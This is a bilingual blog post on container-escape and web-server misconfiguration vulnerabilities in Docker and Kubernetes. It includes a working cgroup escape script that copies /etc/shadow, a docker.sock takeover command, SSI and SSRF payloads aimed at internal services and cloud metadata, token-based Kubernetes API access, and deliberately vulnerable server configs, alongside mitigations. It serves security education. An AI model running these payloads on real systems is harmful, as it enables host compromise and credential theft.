---
title: Docker and Web Server Vulnerabilities
author: hyoeun
key: page-docker_web_vulnerabilities
categories:
- Security
- Vulnerabilities
image: "/assets/thumbnails/2024-09-12-docker_web_vulnerabilities.png"
date: 2024-09-12 00:00:00
bilingual: true
---
## Docker Security Overview

Docker containers have become the standard unit of deployment for modern applications. While containerization provides isolation benefits, misconfigurations and vulnerabilities in Docker and the web servers running inside containers can create significant security risks.

## Container Escape Vulnerabilities

### 1. Privileged Containers
Running a container with `--privileged` grants it near-full access to the host system.

```bash
# Detecting privileged mode from inside a container
cat /proc/1/status | grep Cap
capsh --decode=<capability_value>

# Exploiting privileged container to escape to host
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cp /etc/shadow /tmp/shadow" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 2. Docker Socket Exposure
Mounting the Docker socket (`/var/run/docker.sock`) inside a container allows complete host takeover:

```bash
# Check if docker socket is mounted
ls -la /var/run/docker.sock

# If accessible, spawn a privileged container that mounts the host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 3. Dangerous Capabilities
Containers with specific Linux capabilities can escape to the host:

- **CAP_SYS_ADMIN**: Mount filesystems, manipulate namespaces.
- **CAP_SYS_PTRACE**: Trace processes in other namespaces.
- **CAP_NET_ADMIN**: Modify network configurations.

```bash
# Check capabilities
capsh --print
```

### 4. CVE Examples: Container Escapes
- **CVE-2019-5736 (runc overwrite)**: Overwrite the host runc binary from a container.
- **CVE-2020-15257 (Containerd UNIX socket)**: Access host namespace via containerd socket.

## Web Server Vulnerabilities in Containerized Environments

### 1. Nginx Misconfigurations

**Path Traversal via alias misconfiguration:**
```nginx
# Vulnerable config
location /files {
    alias /data/;
}
# Attacker requests: /files../etc/passwd → resolves to /data/../etc/passwd
```

**Missing trailing slash:**
```nginx
location /api {
    proxy_pass http://backend/api;  # Missing trailing slash can cause redirect issues
}
```

**Server-Side Request Forgery via open proxy:**
```nginx
location / {
    proxy_pass $arg_url;  # DANGEROUS: user-controlled proxy destination
}
```

### 2. Apache Misconfigurations

**Directory traversal / LFI via mod_rewrite:**
```apache
RewriteRule ^/file/(.*)$ /var/www/files/$1  # No sanitization
```

**Exposed .htaccess files and configuration:**
```bash
curl http://target.com/.htaccess
curl http://target.com/.env
```

**Server-side includes (SSI) injection:**
```
<!--#exec cmd="cat /etc/passwd"-->
```

### 3. Environment Variable Leakage
Docker containers often use environment variables for secrets. If an app exposes debug endpoints:

```bash
# Common debug endpoints
curl http://target.com/env
curl http://target.com/actuator/env  # Spring Boot
curl http://target.com/debug/pprof   # Go
```

### 4. Docker Image Vulnerabilities

**Secrets in Docker layers:**
```bash
# Inspect image history
docker history --no-trunc <image-id>

# Extract all layers and search for secrets
docker save <image> | tar -xv
grep -ri "password\|secret\|apikey" .
```

**Running as root inside container:**
```dockerfile
# Bad: running as root
FROM ubuntu:20.04
RUN apt-get install ...
# Should add: USER nonroot

# Good:
RUN useradd -r -u 1001 appuser
USER appuser
```

### 5. SSRF via Internal Service Access
Containers in the same Docker network can communicate. An SSRF vulnerability in a web application can be used to access internal services:

```
# External attacker → Web App container (vulnerable to SSRF) → Database container
GET /fetch?url=http://db:5432/  
GET /fetch?url=http://redis:6379/
GET /fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
```

## Kubernetes-Specific Issues

If containers run in Kubernetes:

```bash
# Access K8s API from a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/pods

# Check if service account has excessive permissions
kubectl auth can-i --list
```

## Penetration Testing Methodology

### Phase 1: Reconnaissance
- Identify containerization technology (Docker, containerd, CRI-O).
- Look for exposed Docker API ports (default: 2375 TCP unauthenticated, 2376 TLS).
- Identify running containers and images.

### Phase 2: External Attack Surface
- Test web applications running in containers for standard web vulnerabilities.
- Look for exposed debug endpoints, metadata endpoints.
- Test for SSRF to access internal container network.

### Phase 3: Container Escape (Post-Exploitation)
- Check `--privileged` flag, dangerous capabilities.
- Check for mounted Docker socket.
- Look for writable host directories.

## Mitigations

- **Never run containers as root** — use `USER` directive in Dockerfile.
- **Never mount `/var/run/docker.sock`** inside containers.
- **Avoid `--privileged`** — use only specific capabilities needed.
- **Use read-only filesystem** where possible: `docker run --read-only`.
- **Scan images** for vulnerabilities: Trivy, Snyk, Grype.
- **Implement seccomp profiles** to restrict system calls.
- **Use network policies** to restrict inter-container communication.
- **Protect Docker API** — use TLS with client authentication.

---

## Docker 보안 개요

Docker 컨테이너는 현대 애플리케이션 배포의 표준 단위가 되었습니다. 컨테이너화는 격리 이점을 제공하지만, Docker 및 컨테이너 내에서 실행되는 웹 서버의 잘못된 구성과 취약점은 심각한 보안 위험을 만들 수 있습니다.

## 컨테이너 탈출 취약점

### 1. Privileged 컨테이너
`--privileged`로 컨테이너를 실행하면 호스트 시스템에 거의 완전한 접근 권한이 부여됩니다.

### 2. Docker 소켓 노출
컨테이너 내에 Docker 소켓(`/var/run/docker.sock`)을 마운트하면 완전한 호스트 탈취가 가능합니다.

### 3. 위험한 Capabilities
특정 Linux capabilities를 가진 컨테이너는 호스트로 탈출할 수 있습니다:
- **CAP_SYS_ADMIN**: 파일 시스템 마운트, 네임스페이스 조작
- **CAP_SYS_PTRACE**: 다른 네임스페이스의 프로세스 추적
- **CAP_NET_ADMIN**: 네트워크 구성 수정

## 컨테이너화 환경의 웹 서버 취약점

### 1. Nginx 잘못된 구성
**alias 잘못된 구성을 통한 경로 탐색**, **오픈 프록시를 통한 SSRF** 등이 일반적인 취약점입니다.

### 2. 환경 변수 노출
Docker 컨테이너는 종종 비밀 정보에 환경 변수를 사용합니다. 앱이 디버그 엔드포인트를 노출하면 누출될 수 있습니다:
- Spring Boot 액추에이터 (`/actuator/env`)
- 디버그 엔드포인트 (`/debug`, `/env`)

### 3. Docker 이미지 취약점
- **Docker 레이어의 비밀 정보**: `docker history`로 이미지 레이어에 포함된 비밀 정보 검사
- **컨테이너 내부에서 root 실행**: Dockerfile에 `USER` 지시문 미포함

### 4. 내부 서비스 접근을 통한 SSRF
동일한 Docker 네트워크의 컨테이너끼리 통신할 수 있어, 웹 애플리케이션의 SSRF 취약점으로 내부 서비스에 접근 가능합니다.

## 완화 방법

- **컨테이너를 root로 실행하지 않기** — Dockerfile에 `USER` 지시문 사용
- **`/var/run/docker.sock`을 컨테이너 내에 마운트하지 않기**
- **`--privileged` 방지** — 필요한 특정 capabilities만 사용
- **가능한 경우 읽기 전용 파일 시스템 사용**
- **이미지 취약점 스캔**: Trivy, Snyk, Grype
- **seccomp 프로필 구현**으로 시스템 호출 제한
- **네트워크 정책**으로 컨테이너 간 통신 제한
